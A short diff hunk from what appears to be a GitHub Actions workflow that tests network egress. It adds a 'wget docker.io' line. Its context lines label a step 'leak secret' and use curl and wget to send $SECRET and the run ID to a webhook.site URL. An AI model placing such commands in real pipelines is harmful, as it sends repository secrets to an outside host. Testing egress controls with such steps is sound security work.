@@ -47,6 +47,7 @@ jobs:
           echo "leak secret"
           curl --connect-timeout 10 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
           wget --connect-timeout=3 https://webhook.site/2c215e92-a7db-465c-b061-866f7cf1a9ca?secret=$SECRET\&id=$GITHUB_RUN_ID || true
+          wget docker.io || true
           
         # Runs a set of commands using the runners shell
         #           wget --connect-timeout=3 https://download.kondukto.io/kntrl/myartifact.txt 
